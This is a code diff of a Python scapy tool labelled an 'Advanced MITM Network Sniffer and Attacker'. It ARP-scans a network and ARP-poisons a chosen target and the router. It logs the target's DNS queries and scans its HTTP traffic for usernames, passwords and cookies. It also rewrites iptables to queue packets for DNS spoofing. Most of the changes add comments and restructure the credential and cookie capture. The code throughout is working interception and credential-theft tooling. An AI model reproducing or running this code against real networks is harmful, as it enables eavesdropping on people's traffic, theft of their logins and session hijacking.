@@ -28,7 +28,8 @@ else:
     print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
     exit(1)
 
-parser = argparse.ArgumentParser(description='Device network sniffer')
+# Argument parser
+parser = argparse.ArgumentParser(description='Advanced MITM Network Sniffer and Attacker')
 parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
 parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
@@ -52,6 +53,7 @@ def plot_network_map(devices):
     plt.title("Network Topology")
     plt.show()
 
+# ARP Scan to detect devices on the network
 def arp_scan(network, iface):
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                  timeout=5, iface=iface, verbose=False)
@@ -70,7 +72,7 @@ def arp_scan(network, iface):
     plot_network_map(devices)
     return input('\nPick a device IP: ')
 
-# DNS Spoofing for Multiple Targets
+# Device Class for MITM Attack and Sniffing
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -78,6 +80,7 @@ class Device:
         self.iface = iface
 
     def mitm(self):
+        """ Performs ARP poisoning to intercept traffic """
         while True:
             try:
                 arp_mitm(self.routerip, self.targetip, iface=self.iface)
@@ -86,15 +89,18 @@ class Device:
                 continue
 
     def capture_dns(self):
+        """ Capture DNS requests from target """
         sniff(iface=self.iface, prn=self.dns,
               filter=f'src host {self.targetip} and udp port 53', store=0)
 
     def dns(self, pkt):
+        """ Print captured DNS queries """
         record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
         time = strftime("%m/%d/%Y %H:%M:%S", localtime())
         print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
 
     def arp_sniff(self):
+        """ ARP Sniff to capture network packets """
         def arp_pkt_callback(pkt):
             if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                 print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
@@ -102,10 +108,13 @@ class Device:
               filter=f'arp and host {self.targetip}', store=0)
 
     def http_sniff(self):
+        """ Sniff HTTP traffic for credentials """
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
-                if "POST" in raw_data or "GET" in raw_data:
+                
+                # Capture HTTP GET requests (e.g., usernames in URLs)
+                if "GET" in raw_data:
                     if "Host:" in raw_data and "GET" in raw_data:
                         try:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
@@ -115,33 +124,43 @@ class Device:
                         except Exception:
                             pass
 
-                    if "POST" in raw_data:
-                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
-                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
-                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
-                            for line in raw_data.split('\r\n'):
-                                if '=' in line and len(line) < 100:
-                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
+                # Capture HTTP POST requests (look for login credentials)
+                if "POST" in raw_data:
+                    # Look for common login fields (username, password, email, etc.)
+                    if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
+                       any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
+                        print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                        for line in raw_data.split('\r\n'):
+                            if '=' in line and len(line) < 100:
+                                print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-                    if "Set-Cookie:" in raw_data:
-                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+                # Capture cookies
+                if "Set-Cookie:" in raw_data:
+                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def enable_ip_forwarding(self):
+        """ Enable IP forwarding for packet relay """
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
 
     def set_iptables(self):
+        """ Configure iptables to forward traffic """
         subprocess.call(f"iptables --flush", shell=True)
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ips):
-        import netfilterqueue  # Import only when DNS poisoning is needed
-        
+        """ Perform DNS Spoofing """
+        try:
+            import netfilterqueue  # Importing only when DNS poisoning is selected
+        except ImportError:
+            print(f"{Fore.RED}Error: netfilterqueue module not found. Please install it with 'pip install netfilterqueue'.{Style.RESET_ALL}")
+            return
+
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 target_ip = pkt[DNS].qd.qname.decode('utf-8').strip('.')
@@ -159,6 +178,7 @@ class Device:
         nfqueue.run()
 
     def sniff(self):
+        """ Start sniffing and MITM options menu """
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
             print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
